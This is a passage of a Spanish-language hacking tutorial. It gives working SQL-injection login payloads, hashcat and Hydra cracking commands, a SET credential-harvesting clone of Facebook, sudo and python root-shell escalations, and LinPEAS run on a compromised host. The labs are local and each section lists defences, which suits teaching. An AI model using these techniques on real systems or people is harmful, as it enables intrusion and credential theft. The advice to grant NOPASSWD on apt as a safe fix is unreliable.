CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa';
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

##### 4. Configura el archivo:

```bash
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php
```

Edita estas líneas:

```php
$_DVWA[ 'db_user' ] = 'dvwa';
$_DVWA[ 'db_password' ] = 'dvwa';
```

---

##### 5. Abre el navegador:

Accede a:
📎 `http://localhost/DVWA`

Y crea la base de datos desde la web con el botón **"Create / Reset Database"**.

✅ ¡Listo para practicar!

---

### 🔍 Ejemplo completo: SQL Injection para Login Bypass en DVWA

#### Nivel de seguridad: **Low**

1. Ve a:
   `http://localhost/DVWA/vulnerabilities/brute/`

   o

   `http://localhost/DVWA/vulnerabilities/login/` (según la versión)

2. Introduce en **usuario**:

```
' OR '1'='1
```

Y en **contraseña**:

```
' OR '1'='1
```

✅ ¡Te logueaste sin conocer la contraseña real!

---

#### 🧪 Variantes de payloads comunes para Login Bypass

| Payload                   | Descripción                               |
| ------------------------- | ----------------------------------------- |
| `' OR '1'='1`             | Inyección básica que siempre es verdadera |
| `' OR 1=1-- `             | Comenta el resto de la consulta           |
| `admin' -- `              | Cierra el string y comenta la contraseña  |
| `' UNION SELECT 1,2,3-- ` | Prueba de columnas (enumeración)          |

---

### 🛡️ ¿Cómo prevenirlo?

- **Usar consultas preparadas (prepared statements)** con `PDO` o `MySQLi`
- **Validar y sanitizar** las entradas del usuario
- **Nunca concatenar** directamente texto en las consultas SQL

---

### 💡 Conclusión resumida

| Concepto                           | Explicación                                                        |
| ---------------------------------- | ------------------------------------------------------------------ |
| ¿Qué es SQL Injection?             | Insertar código malicioso en consultas SQL                         |
| ¿Qué es Login Bypass?              | Acceder a un sistema sin credenciales válidas                      |
| ¿Cómo se practica de forma segura? | Usando DVWA en local                                               |
| ¿Cómo prevenirlo?                  | Usar consultas preparadas + validación de inputs                   |
| ¿Qué hicimos en el ejemplo?        | Entramos al sistema con `' OR '1'='1` sin saber la contraseña real |

---

[🔼](#índice)

---

## **986. Password Cracking**

### 🔐 ¿Qué es el Password Cracking?

**Password Cracking** es el proceso de **recuperar una contraseña** a partir de su **hash** o desde un formulario de ingreso, utilizando diferentes técnicas y herramientas.
Suele usarse en **auditorías de seguridad** (pentesting) para verificar si las contraseñas de los usuarios son débiles.

---

### 🧠 ¿Por qué importa?

Cuando un atacante roba **hashes de contraseñas** desde una base de datos, no ve las contraseñas directamente, sino algo como:

```
5f4dcc3b5aa765d61d8327deb882cf99
```

Esto es un hash MD5 de: `password`.

El **crackeo** consiste en descubrir que ese hash corresponde a la palabra `password`.

---

### 🛠️ Tipos de Password Cracking

| Tipo                         | ¿Qué hace?                                       |
| ---------------------------- | ------------------------------------------------ |
| **Ataque de diccionario**    | Usa un archivo de palabras comunes               |
| **Fuerza bruta**             | Prueba todas las combinaciones posibles          |
| **Ataque híbrido**           | Combina diccionario + variaciones (123, !, etc.) |
| **Ataque por reglas**        | Aplica patrones de transformación sobre palabras |
| **Ataque de tabla arcoiris** | Usa tablas precalculadas de hash ↔ palabra       |

---

### ⚙️ ¿Cómo se instala un entorno para practicar? (100% seguro y ético)

#### ✅ Requisitos:

- Tener **Kali Linux** o **Ubuntu** (o usar WSL en Windows)
- Instalar herramienta como **Hashcat** o **John the Ripper**
- Tener un archivo con **hashes**
- Tener un **diccionario de contraseñas** (por ejemplo, RockYou.txt)

---

### 🔧 Instalación (con Hashcat)

#### ✅ En Kali Linux o Ubuntu:

```bash
sudo apt update
sudo apt install hashcat -y
```

📁 El diccionario RockYou viene por defecto en Kali:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

### 🔑 Ejemplo completo: Cracking de un hash MD5 con Hashcat

Supongamos que tienes este hash MD5:

```
5f4dcc3b5aa765d61d8327deb882cf99
```

Ese hash corresponde a `password`.

---

#### 🧪 Paso 1: Crear un archivo con el hash

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
```

---

#### 🧪 Paso 2: Ejecutar Hashcat

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

##### Explicación de parámetros:

| Parámetro     | Significado                        |
| ------------- | ---------------------------------- |
| `-m 0`        | Tipo de hash: `0` = MD5            |
| `-a 0`        | Modo de ataque: diccionario        |
| `hash.txt`    | Archivo con el hash objetivo       |
| `rockyou.txt` | Diccionario de contraseñas comunes |

---

#### ⏳ Espera unos segundos...

Si la palabra `password` está en el diccionario, verás algo como:

```
5f4dcc3b5aa765d61d8327deb882cf99:password
```

🎉 ¡Éxito! Has crackeado tu primer hash.

---

### 🧰 ¿Y si es SHA-1, SHA-256, bcrypt?

Hashcat soporta cientos de tipos de hash. Algunos ejemplos:

| Tipo de hash       | Código en Hashcat |
| ------------------ | ----------------- |
| MD5                | 0                 |
| SHA-1              | 100               |
| SHA-256            | 1400              |
| bcrypt (\$2y\$...) | 3200              |
| NTLM (Windows)     | 1000              |

---

### 🛡️ ¿Cómo protegerse del Password Cracking?

| Técnica                             | ¿Por qué es útil?                                        |
| ----------------------------------- | -------------------------------------------------------- |
| **Contraseñas fuertes y únicas**    | Difíciles de adivinar o atacar                           |
| **Hashing con salt**                | Hace únicos los hashes (defensa contra tablas arcoiris)  |
| **Usar bcrypt, scrypt, Argon2**     | Hashes diseñados para ser lentos y resistentes a ataques |
| **Límite de intentos / bloqueo IP** | Previene fuerza bruta en formularios web                 |
| **2FA**                             | Añade una segunda capa de seguridad                      |

---

### 📘 Resumen

| Tema                          | Detalles                                                        |
| ----------------------------- | --------------------------------------------------------------- |
| ¿Qué es Password Cracking?    | Intento de descubrir una contraseña desde su hash               |
| ¿Cómo se practica éticamente? | Usando herramientas como Hashcat o John en entornos controlados |
| ¿Cómo lo hicimos?             | Usamos Hashcat para crackear un hash MD5 con diccionario        |
| ¿Cómo defenderse?             | Hash robusto + contraseñas fuertes + 2FA                        |

---

[🔼](#índice)

---

## **987. Broken Access Control**

### 🧨 ¿Qué es Broken Access Control?

**Broken Access Control (BAC)** ocurre cuando un sistema **no protege adecuadamente los recursos**, y permite que los usuarios accedan a funciones, datos o páginas que **no deberían**.

---

### 🧠 Ejemplo simple para entenderlo:

Supón que tienes esta app web:

```
https://misitio.com/perfil?id=1001   ← Usuario Juan
https://misitio.com/perfil?id=1002   ← Usuario Pedro
```

Si Juan cambia manualmente la URL a `id=1002` y puede ver el perfil de Pedro **sin restricción**, entonces hay un **control de acceso roto**.

---

### 🔑 Tipos comunes de BAC:

| Tipo                           | Ejemplo práctico                                           |
| ------------------------------ | ---------------------------------------------------------- |
| Acceso horizontal              | Usuario A accede a recursos de usuario B                   |
| Acceso vertical                | Usuario normal accede a funciones de administrador         |
| Métodos HTTP inseguros         | Se puede usar `PUT`, `DELETE` sin permiso                  |
| Esconder elementos en frontend | El botón se oculta pero la función sigue accesible por URL |

---

### ⚙️ ¿Cómo se instala un entorno para practicar?

La mejor opción es usar **OWASP Broken Access Control Lab** o **DVWA** o **OWASP Juice Shop**.

---

#### ✅ Opción recomendada: OWASP Juice Shop (instalación rápida)

Juice Shop es una aplicación vulnerable moderna que **incluye fallas de control de acceso**.

---

##### 🔧 Paso 1: Instala Node.js (si aún no tienes)

```bash
sudo apt update
sudo apt install nodejs npm -y
```

---

##### 🔧 Paso 2: Instala OWASP Juice Shop

```bash
sudo npm install -g @juice-shop/juice-shop
```

---

##### 🔧 Paso 3: Ejecuta la app

```bash
juice-shop
```

Esto iniciará el sitio en:

```
http://localhost:3000
```

---

### 🍹 Alternativa: Usa la versión web sin instalación

Juice Shop online (gratuito y legal):

🌐 [https://owasp.org/www-project-juice-shop/](https://owasp.org/www-project-juice-shop/)

---

### ✅ Ejemplo completo: Broken Access Control en Juice Shop

---

#### 🎯 Objetivo: Ver la página de administración sin ser admin

1. Abre: `http://localhost:3000`
2. Regístrate con un correo y contraseña cualquiera
3. Inicia sesión como usuario normal
4. Abre el navegador y ve a:

```
http://localhost:3000/#/administration
```

---

### 🧪 ¿Qué pasó?

Aunque **no hay enlace visible para usuarios normales**, si escribes la URL manualmente, **puedes entrar al panel de administración**.
Este es un **acceso vertical roto**.

---

### 🧱 ¿Cómo debería protegerse?

El backend **debe validar siempre** el rol del usuario en cada solicitud. No es suficiente ocultar botones en el frontend.

---

#### 🛡️ Buenas prácticas para prevenir Broken Access Control

| Acción                             | ¿Por qué ayuda?                                   |
| ---------------------------------- | ------------------------------------------------- |
| Validar roles en backend           | El frontend puede ser manipulado                  |
| Evitar IDs predecibles             | Como `/user?id=1` o `/file/101.pdf`               |
| Implementar controles por política | Por ejemplo: "solo admins pueden borrar usuarios" |
| Usar tokens JWT con roles          | Para verificar permisos en cada acción            |
| Auditar rutas y métodos            | Asegurar que cada endpoint verifica permisos      |
| Evitar confiar en ocultar botones  | El HTML puede inspeccionarse fácilmente           |

---

### 💡 Simulación simple para entenderlo desde cero

#### 🧪 Supón que tienes un código en Node.js (Express):

```js
app.get("/admin", (req, res) => {
  res.send("Panel de administración");
});
```

Esto **no verifica si el usuario es admin**. Cualquiera que conozca la URL puede entrar.

---

#### ✅ Corrección adecuada:

```js
app.get("/admin", (req, res) => {
  if (req.user && req.user.role === "admin") {
    res.send("Panel de administración");
  } else {
    res.status(403).send("Acceso denegado");
  }
});
```

---

### 📘 Resumen

| Tema                        | Descripción clara                                                 |
| --------------------------- | ----------------------------------------------------------------- |
| ¿Qué es?                    | Error en validación de permisos                                   |
| ¿Cómo se explota?           | Accediendo directamente a URLs, usando funciones sin autorización |
| ¿Cómo se practica?          | Con OWASP Juice Shop, DVWA u otras apps vulnerables               |
| ¿Cómo se evita?             | Validación en backend, tokens seguros, control de roles           |
| ¿Qué hicimos en el ejemplo? | Entramos al panel admin sin tener permisos                        |

---

[🔼](#índice)

---

## **988. Password Guessing**

### 🔐 ¿Qué es Password Guessing?

**Password Guessing** es el proceso de **adivinar una contraseña manual o automáticamente** sin necesidad de obtener un hash o usar técnicas avanzadas como cracking.

Suele ser **el primer paso** que un atacante intenta, especialmente en formularios de login (como correos, redes sociales, SSH, RDP, FTP, etc.).

---

#### 🎯 ¿En qué se diferencia del Password Cracking?

| **Password Guessing**                   | **Password Cracking**                             |
| --------------------------------------- | ------------------------------------------------- |
| Intenta acceder directamente al sistema | Intenta romper un hash para conocer la contraseña |
| Usa login con usuario y contraseña      | Usa archivo de hashes (sin login)                 |
| Necesita conexión al sistema objetivo   | No necesita acceso al login                       |
| Ej: página de inicio de sesión          | Ej: base de datos filtrada                        |

---

### 📌 Ejemplo fácil de entender

Tienes un sistema de login:

```
Usuario: admin
Contraseña: ?
```

Si pruebas manualmente:

- `admin / 123456`
- `admin / password`
- `admin / admin123`

y uno funciona, has hecho un **Password Guessing exitoso**.

---

### ⚙️ ¿Cómo se instala un entorno para practicar?

#### ✅ Opción segura: Instalar DVWA (Damn Vulnerable Web App)

DVWA es una aplicación web vulnerable para practicar ataques como el password guessing y otros.

---

##### 🔧 Paso 1: Instalar XAMPP (servidor web)

Descarga desde:
👉 [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)

Instala y enciende **Apache + MySQL**

---

##### 🔧 Paso 2: Descargar DVWA

```bash
cd /opt/lampp/htdocs
sudo git clone https://github.com/digininja/DVWA.git
```

---

##### 🔧 Paso 3: Configurar base de datos

1. Copia y edita el archivo de configuración:

```bash
cd DVWA/config
cp config.inc.php.dist config.inc.php
```

2. Abre `config.inc.php` y asegúrate que esté así:

```php
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = ''; // si no tienes contraseña en XAMPP
```

---

##### 🔧 Paso 4: Inicia DVWA

1. En tu navegador ve a:

```
http://localhost/DVWA
```

2. Ve a `Setup → Create/Reset Database`

3. Ingresa como:

```
Usuario: admin
Contraseña: password
```

4. Cambia el nivel de seguridad a **Low** desde `DVWA Security`

---

### ✅ Ejemplo completo de Password Guessing

#### 🧪 Objetivo: Acceder con una contraseña adivinada

1. Ve a: `http://localhost/DVWA/vulnerabilities/brute/`

2. En la interfaz verás un formulario:

   ```
   Usuario: admin
   Contraseña: [          ]
   ```

3. Intenta contraseñas comunes como:

   - `admin`
   - `123456`
   - `password`
   - `letmein`

4. Si alguna funciona, has realizado **Password Guessing manual exitosamente**.

---

### 🤖 ¿Y si quiero hacerlo automáticamente?

Usa **Hydra**, una herramienta que automatiza el intento de contraseñas en muchos servicios (HTTP, SSH, FTP, etc.).

---

#### 🛠️ Instalación de Hydra (Kali Linux o Ubuntu)

```bash
sudo apt update
sudo apt install hydra -y
```

---

#### ✅ Ejemplo automático: Login en DVWA con Hydra (HTTP POST)

Supón que DVWA está en:

```
http://localhost/DVWA/login.php
```

Y tienes un diccionario de contraseñas como `rockyou.txt` (viene en Kali):

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

#### Comando Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

> 🔍 Este comando le dice a Hydra que intente loguearse como `admin`, probando todas las contraseñas del diccionario, y detecte si falla por el mensaje `"Login failed"`.

---

#### ✅ Resultado esperado:

Si alguna contraseña coincide (por ejemplo `password`), Hydra lo mostrará así:

```
[80][http-post-form] host: localhost   login: admin   password: password
```

🎉 ¡Has hecho un Password Guessing exitoso de forma automática!

---

### 🛡️ ¿Cómo prevenir el Password Guessing?

| Estrategia                  | ¿Por qué sirve?                          |
| --------------------------- | ---------------------------------------- |
| Limitar intentos de login   | Evita que prueben muchas contraseñas     |
| Implementar reCAPTCHA       | Dificulta automatización                 |
| Usar contraseñas fuertes    | Difíciles de adivinar                    |
| Registrar IPs sospechosas   | Detecta patrones de ataque               |
| Habilitar autenticación 2FA | Aunque adivinen la contraseña, no entran |

---

### 📘 Resumen

| Tema                       | Explicación breve                             |
| -------------------------- | --------------------------------------------- |
| ¿Qué es Password Guessing? | Probar contraseñas en formularios o servicios |
| ¿Cómo se practica?         | Manualmente o con herramientas como Hydra     |
| ¿Dónde se puede probar?    | En DVWA, Juice Shop, TryHackMe, HackTheBox    |
| ¿Cómo se previene?         | 2FA, límites, reCAPTCHA, contraseñas fuertes  |

---

[🔼](#índice)

---

## **989. Ingeniería social**

### 🧠 ¿Qué es la Ingeniería Social?

La **ingeniería social** es un conjunto de técnicas que se usan para **manipular psicológicamente a una persona** y hacer que realice acciones o revele información confidencial.

En lugar de atacar un sistema directamente, se **ataca a los usuarios** del sistema: empleados, clientes, técnicos, etc.

---

### 🎯 Ejemplo fácil de entender:

> Supón que un atacante llama diciendo:
>
> _"Hola, soy del área de soporte técnico. Estamos haciendo mantenimiento. ¿Podrías confirmarme tu usuario y contraseña para evitar bloqueos?"_
>
> Si la persona cae y da su contraseña, el atacante ha tenido éxito con una técnica de ingeniería social.

---

### 🧪 Tipos comunes de ataques de ingeniería social:

| Tipo de ataque | Explicación clara                              | Ejemplo práctico                        |
| -------------- | ---------------------------------------------- | --------------------------------------- |
| **Phishing**   | Correos falsos que imitan ser legítimos        | “Tu banco necesita verificar tu cuenta” |
| **Vishing**    | Ingeniería social por llamada telefónica       | “Hola, soy del banco, necesito tu DNI”  |
| **Smishing**   | SMS falsos con enlaces maliciosos              | “Haz clic para ver tu recibo de pago”   |
| **Pretexting** | Inventar una historia para engañar             | “Soy auditor, necesito acceso urgente”  |
| **Tailgating** | Entrar físicamente a un lugar siguiendo a otro | Entrar detrás de un empleado con carnet |
| **Baiting**    | Dejar dispositivos o archivos tentadores       | USB en el piso rotulado como “planilla” |

---

### 🧱 ¿Por qué funciona la ingeniería social?

Porque **los humanos confiamos por naturaleza**, especialmente si:

- La solicitud parece urgente
- Quien la hace aparenta autoridad
- Apela al miedo, urgencia o recompensa
- Se disfraza como una persona interna

---

### 🧰 ¿Cómo se puede practicar o simular? (¡Legal y ético!)

Vamos a instalar un entorno de laboratorio para **simular campañas de ingeniería social**, como **phishing**.

---

### 🛠️ Cómo instalar un entorno de pruebas para Ingeniería Social

#### ✅ Herramienta: **Social-Engineer Toolkit (SET)**

Es una herramienta en Kali Linux para simular ataques de ingeniería social (phishing, payloads, etc.).

---

#### 📦 Paso 1: Instalar Kali Linux (si aún no tienes)

Puedes instalarlo en máquina virtual con VirtualBox desde:
👉 [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

---

#### ⚙️ Paso 2: SET ya viene instalado en Kali

Pero si quieres instalarlo manualmente:

```bash
sudo apt update
sudo apt install set -y
```

---

#### ▶️ Paso 3: Ejecutar SET

```bash
sudo setoolkit
```

Verás un menú como este:

```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
...
```

---

#### ✅ Vamos a usar esta ruta para simular phishing:

```
1) Social-Engineering Attacks
→ 2) Website Attack Vectors
→ 3) Credential Harvester Attack Method
→ 2) Site Cloner
```

Luego SET te pedirá:

- **La IP de tu Kali Linux:** Por ejemplo `192.168.1.8`
- **La URL que quieres clonar:** Por ejemplo `https://facebook.com`

SET descargará la página real, y la clonará, pero capturará **usuario y contraseña** ingresados en tu versión falsa.

---

### 🔥 Ejemplo completo: Ataque de phishing simulado con SET

#### Escenario:

Quieres simular un phishing para ver si un usuario cae en una página falsa de login de Facebook.

---

#### 1️⃣ Lanza SET

```bash
sudo setoolkit
```

Navega por los menús:

- `1) Social-Engineering Attacks`
- `2) Website Attack Vectors`
- `3) Credential Harvester`
- `2) Site Cloner`

---

#### 2️⃣ Ingresa IP local (por ejemplo):

```
Ingresa tu IP: 192.168.1.10
```

#### 3️⃣ Ingresa URL a clonar:

```
https://facebook.com
```

SET montará un servidor en `http://192.168.1.10` con una copia de Facebook.

---

#### 4️⃣ Enviar link a la "víctima" (en este caso tú mismo en otra máquina)

Cuando ingreses usuario y contraseña, SET capturará:

```
[*] Credenciales encontradas:
usuario: jdoe@example.com
contraseña: 12345678
```

> ¡Este es un ejercicio de laboratorio controlado! Nunca lo hagas sin permiso.

---

### 🛡️ ¿Cómo prevenir ataques de ingeniería social?

| Recomendación                    | ¿Por qué sirve?                                  |
| -------------------------------- | ------------------------------------------------ |
| Capacitación constante           | El personal aprende a detectar engaños           |
| Simulacros de phishing internos  | Para entrenar y medir respuestas                 |
| Verificación por doble canal     | Si algo parece sospechoso, llamar para confirmar |
| Revisar URLs antes de hacer clic | Muchos phishing usan dominios falsos similares   |
| Activar 2FA                      | Incluso si se roba la contraseña, no se accede   |

---

### 📘 Resumen

| Tema                | Explicación breve                                    |
| ------------------- | ---------------------------------------------------- |
| ¿Qué es?            | Engañar a personas para obtener acceso o información |
| Tipos               | Phishing, vishing, baiting, pretexting, etc.         |
| Entorno de práctica | SET en Kali Linux para simular páginas falsas        |
| Ejemplo             | Clonar Facebook y capturar datos en entorno seguro   |
| Prevención          | Educación, 2FA, verificación por canales confiables  |

---

[🔼](#índice)

---

## **990. Sudo Security Bypass**

### 🔐 ¿Qué es un Sudo Security Bypass?

**Sudo** (Super User DO) es una herramienta en sistemas Linux que permite a usuarios ejecutar comandos con privilegios de superusuario **temporalmente**. Un **bypass de seguridad en sudo** ocurre cuando un atacante logra **elevar privilegios o ejecutar comandos como root** **sin tener autorización** debido a una mala configuración o vulnerabilidad.

---

#### 🧠 ¿Por qué es importante?

Si un atacante logra abusar de `sudo` sin la contraseña o sin permisos adecuados, **puede tomar control completo del sistema**, instalar malware, leer archivos sensibles o crear puertas traseras.

---

### 🔎 Casos comunes de Sudo Bypass:

| Tipo de bypass                    | Ejemplo práctico                                 |
| --------------------------------- | ------------------------------------------------ |
| **Configuración incorrecta**      | Permitir al usuario ejecutar comandos peligrosos |
| **Nopasswd en sudoers**           | Ejecutar como root sin pedir contraseña          |
| **Uso de comandos peligrosos**    | Como `vim`, `less`, `python`, `bash`, etc.       |
| **Vulnerabilidades en versiones** | Ej: CVE-2019-14287 o CVE-2021-3156               |

---

### ✅ Ejemplo simple para entender

Supongamos que `usuario1` tiene este permiso en el archivo `/etc/sudoers`:

```bash
usuario1 ALL=(ALL) NOPASSWD: /usr/bin/vim
```

Esto le permite ejecutar `vim` **como root** sin contraseña:

```bash
sudo /usr/bin/vim
```

Y dentro de vim puedes ejecutar comandos del sistema:

```
:!sh
```

¡Y ya tienes una shell root! 😱

---

### 🧪 Cómo instalar un entorno para practicar

#### ✅ Opción recomendada: **Máquina virtual con Kali Linux o Ubuntu**

Puedes usar **VirtualBox** o **VMware** para crear una máquina virtual y hacer las pruebas sin riesgo.

---

#### 📦 Paso 1: Instalar Kali Linux (o Ubuntu)

- Descarga Kali desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
- O Ubuntu desde: [https://ubuntu.com/download](https://ubuntu.com/download)

---

#### 📦 Paso 2: Crear usuario sin privilegios

```bash
sudo adduser usuario1
sudo usermod -aG sudo usuario1
```

---

#### 📦 Paso 3: Editar sudoers (con cuidado)

Usa `visudo` (¡no edites `/etc/sudoers` directo!):

```bash
sudo visudo
```

Y agrega al final:

```bash
usuario1 ALL=(ALL) NOPASSWD: /usr/bin/vim
```

Esto permite a `usuario1` usar `vim` como root **sin contraseña**.

---

### 🚨 ¡Ahora el bypass!

1. Cambia al usuario:

```bash
su - usuario1
```

2. Ejecuta `vim` como root:

```bash
sudo /usr/bin/vim
```

3. Abre una shell desde vim:

```vim
:!bash
```

4. Comprueba que eres root:

```bash
whoami
```

Resultado:

```
root
```

¡Has escalado privilegios sin saber la contraseña root!

---

### 🛡️ ¿Cómo prevenir Sudo Bypass?

| Recomendación                      | Explicación breve                                        |
| ---------------------------------- | -------------------------------------------------------- |
| No uses NOPASSWD innecesario       | Pide siempre contraseña para sudo                        |
| Evita permitir comandos peligrosos | Vim, nano, python, bash, etc. pueden romper la seguridad |
| Usa `sudoedit` en vez de dar `vim` | sudoedit no da acceso a comandos de sistema              |
| Revisa el archivo `/etc/sudoers`   | Cada cierto tiempo audita permisos                       |
| Mantén sudo actualizado            | Existen vulnerabilidades como CVE-2021-3156              |

---

### 🧱 Ejemplo completo y paso a paso

#### 🎯 Objetivo: Escalar a root usando un bypass de sudo

---

#### 🧪 PASO 1: Usuario `usuario1` con permiso NOPASSWD

```bash
sudo visudo
```

Agrega:

```bash
usuario1 ALL=(ALL) NOPASSWD: /usr/bin/vim
```

---

#### 🧪 PASO 2: Usa vim para abrir shell root

```bash
su - usuario1
sudo /usr/bin/vim
```

En vim:

```vim
:!bash
```

---

#### 🧪 PASO 3: Verifica que eres root

```bash
whoami
```

✅ Salida:

```
root
```

---

### 🧯 ¿Cómo corregir este error?

1. Quita el permiso NOPASSWD de `vim`
2. Usa visudo para dejar algo así:

```bash
usuario1 ALL=(ALL) NOPASSWD: /usr/bin/apt
```

(apt es más seguro porque no da acceso a shell directamente)

---

### 📘 Resumen

| Elemento                   | Detalle clave                                  |
| -------------------------- | ---------------------------------------------- |
| ¿Qué es?                   | Saltarse protecciones de `sudo`                |
| ¿Cómo ocurre?              | Configuración insegura o vulnerabilidad        |
| Herramientas para probarlo | Kali Linux, VirtualBox, sudo, vim              |
| Ejemplo                    | Usar `vim` para abrir shell root               |
| Prevención                 | No usar NOPASSWD o revisar comandos permitidos |

---

[🔼](#índice)

---

## **991. Linpeas**

### 🧠 ¿Qué es LinPEAS?

**LinPEAS** (Linux Privilege Escalation Awesome Script) es una herramienta automatizada que escanea un sistema Linux en busca de **vulnerabilidades, configuraciones incorrectas o debilidades** que pueden permitir a un atacante **escalar privilegios**.

> En resumen: **LinPEAS te ayuda a encontrar caminos para convertirte en root** desde un usuario sin privilegios.

---

### 🔍 ¿Qué analiza LinPEAS?

Algunas de las cosas que revisa son:

| Categoría                       | Ejemplos detectables                                       |
| ------------------------------- | ---------------------------------------------------------- |
| Permisos mal configurados       | Archivos con permisos `777`, sudoers mal configurado       |
| Archivos ejecutables peligrosos | Bash, Python, Perl, Vim en sudo                            |
| Archivos con SUID o SGID        | `/usr/bin/passwd`, scripts propios con permisos peligrosos |
| Credenciales en texto plano     | `.bash_history`, `.env`, `wp-config.php`, etc.             |
| Versiones vulnerables           | Kernel, sudo, cronjobs, servicios                          |
| Variables de entorno peligrosas | `$PATH` maliciosas, `LD_PRELOAD`, etc.                     |
| Cron jobs inseguros             | Cron jobs editables por usuarios no root                   |
| Capabilities y configuraciones  | Binary capabilities (`cap_setuid`, `cap_net_bind_service`) |

---

### 📥 ¿Cómo se instala LinPEAS?

LinPEAS es un **script bash**, por lo tanto **no necesita instalación**. Solo debes **descargarlo y ejecutarlo**.

#### ✅ Opción 1: Descargar directamente desde GitHub

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

> 🔐 Este comando descarga la última versión y la hace ejecutable.

---

#### ✅ Opción 2: Clonar todo el repositorio PEASS-ng

```bash
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng/linPEAS
chmod +x linpeas.sh
```

---

### ✅ Cómo ejecutar LinPEAS (básico)

Como usuario limitado:

```bash
./linpeas.sh
```

O si estás en una máquina víctima a la que accediste por SSH o reverse shell, sube el archivo por SCP:

```bash
scp linpeas.sh usuario@ip_victima:/tmp
```

Y luego:

```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

---

#### ⚠️ NOTA: Si estás en una máquina sin `wget`, puedes usar:

```bash
curl -O https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

---

### 🎯 Ejemplo fácil de entender (resumen de resultados)

Supón que lo ejecutas y ves algo como:

```
[+] Sudo version: 1.8.25
    * This version is vulnerable to CVE-2019-14287

[+] User is allowed to run the following via sudo:
    (ALL) NOPASSWD: /usr/bin/vim

[+] Interesting Files:
    /home/user/.bash_history
    /etc/shadow (readable!)

[+] Writable SUID binaries:
    /usr/bin/suid-bin
```

🔍 Esto ya te da **3 posibles caminos para escalar privilegios**:

1. **Sudo vulnerable**
2. **Vim sin contraseña**
3. **Archivo SUID personalizado editable**

---

### 🧪 Ejemplo completo: Paso a paso

#### ⚙️ Escenario:

- Usuario limitado `gustavo` en una máquina Linux
- Tienes acceso por SSH o reverse shell

---

#### 🔧 Paso 1: Subir linpeas.sh

Desde tu máquina atacante (Kali, por ejemplo):

```bash
scp linpeas.sh gustavo@192.168.100.100:/tmp
```

---

#### 🔧 Paso 2: Dar permisos y ejecutarlo

Ya dentro de la máquina víctima:

```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

---

#### 🔎 Paso 3: Revisar los resultados

Verás una salida larga con colores (verde = interesante, rojo = crítico, amarillo = posible vector).

Busca cosas como:

- Permisos sudo sin contraseña
- Binarios con SUID
- Archivos `.bash_history`, `.git-credentials`
- Servicios en ejecución como cron jobs inseguros
- Versiones de kernel vulnerables

---

#### 🛠️ Paso 4: Tomar acción

Supón que encuentras esto:

```
(ALL) NOPASSWD: /usr/bin/python
```

¡Puedes ejecutar shell como root fácilmente!

```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

Y luego:

```bash
whoami
```

✅ Resultado: `root`

---

### 🛡️ ¿Cómo se defiende uno de LinPEAS?

| Medida                           | ¿Qué evita?                                    |
| -------------------------------- | ---------------------------------------------- |
| Configurar sudoers correctamente | Evita escaladas por comandos peligrosos        |
| Revisar permisos de archivos     | Evita exposición de archivos sensibles         |
| Actualizar kernel y sudo         | Evita exploits por vulnerabilidades conocidas  |
| Auditar cron jobs                | Evita ejecuciones inseguras o automáticas      |
| Limpiar historial y credenciales | Evita exposición de contraseñas en texto plano |

---

### 📘 Resumen

| Elemento             | Descripción breve                                                  |
| -------------------- | ------------------------------------------------------------------ |
| ¿Qué es?             | Script bash que detecta vectores de escalada de privilegios        |
| ¿Cómo se instala?    | Descarga el `.sh`, sin instalación extra                           |
| ¿Cómo se ejecuta?    | `./linpeas.sh` o subirlo por SCP                                   |
| ¿Qué busca?          | Configuraciones inseguras, binarios peligrosos, archivos sensibles |
| ¿Resultado esperado? | Muestra múltiples caminos para obtener root                        |
| ¿Cómo prevenirlo?    | Mantener buenas prácticas de hardening y configuración de sistema  |

---

[🔼](#índice)

---

## **992. Cracking de llaves SSH privadas con John the Ripper**

### 🧠 ¿Qué es el cracking de llaves SSH privadas?

Cuando un atacante obtiene una **clave privada SSH** (`id_rsa`) cifrada (es decir, protegida con contraseña), **no puede usarla directamente** si no conoce esa contraseña.

El **cracking de llaves SSH** consiste en **descifrar** esa contraseña para poder **usar la llave privada** y acceder como ese usuario a un servidor.

---

### 🛠️ Herramienta: John the Ripper

**John the Ripper** (o **John**) es una herramienta muy potente de cracking de contraseñas que permite:

- Romper hashes de contraseñas (MD5, SHA, etc.)
- Cracking de llaves SSH protegidas por contraseña
- Ataques de diccionario, fuerza bruta, y combinaciones

---

### 📥 ¿Cómo instalar John the Ripper?

#### ✅ En Kali Linux o Parrot (ya viene instalado)

Solo escribe:

```bash
john
```

Si no lo tienes:

#### ✅ En Ubuntu / Debian:

```bash
sudo apt update
sudo apt install john -y
```

O puedes compilar la versión “Jumbo” desde GitHub si quieres más funciones:

```bash
git clone https://github.com/openwall/john.git
cd john/src
./configure && make -s clean && make -sj4
```

Se instalará en `john/run/`.

---

### 📂 ¿Qué necesitas para crackear una llave SSH?

- Un archivo **id_rsa** (privado) cifrado con contraseña
- Un diccionario (`.txt`) con posibles contraseñas
- John the Ripper

---

### 🧪 Ejemplo completo paso a paso

#### 🔧 Paso 1: Simula que encuentras una clave SSH cifrada

Supón que tienes esta clave privada:

`id_rsa` (cifrada)

Guárdala como `id_rsa`:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
